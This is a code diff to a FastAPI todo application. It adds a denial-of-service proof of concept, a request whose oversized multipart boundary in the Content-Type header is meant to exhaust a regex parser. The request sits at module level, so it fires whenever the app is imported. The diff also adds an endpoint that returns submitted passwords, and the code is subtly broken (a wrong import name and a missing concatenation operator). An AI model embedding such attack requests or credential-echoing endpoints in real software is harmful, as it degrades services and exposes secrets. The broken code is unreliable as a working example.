@@ -1,9 +1,28 @@
-from fastapi import FastAPI
+from fastapi import FastAPI, form
 from fastapi.middleware.cors import CORSMiddleware
 from typing import List, Optional
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.requests import Request
 from pydantic import BaseModel
+import requests
+# The URL of the FastAPI application endpoint
+url = "http://127.0.0.1:8082/submit-form/"
+
+# Crafted malicious Content-Type header designed 
+# to exploit the regex processing vulnerability
+# In a real attack, the string here would be designed to cause the regex 
+# parser to consume excessive resources.
+content_type = "multipart/form-data; boundary=----WebKitFormBoundary" \
+                ("A" * 1000) + "X"
+
+# Sample form data to accompany the request
+data = "------WebKitFormBoundary\r\nContent-Disposition:" + \
+       "form-data; name=\"username\"\r\n\r\nadmin\r\n------WebKitFormBoundary--"
+
+# Sending the request with the custom Content-Type header
+response = requests.post(url, data=data, headers={"Content-Type": content_type})
+
+print(response.text)
 
 app: FastAPI = FastAPI()
 
@@ -27,6 +46,9 @@ async def get_todos(message: str):
     return {"status": message,
             "items": todo_items}
 
+@app.post("/submit-form/")
+async def submit_form(username: str = Form(...), password: str = Form(...)):
+    return {"username": username, "password": password}
 
 @app.post("/api/add", response_class=JSONResponse)
 async def add_todo_item(item: TodoItem):
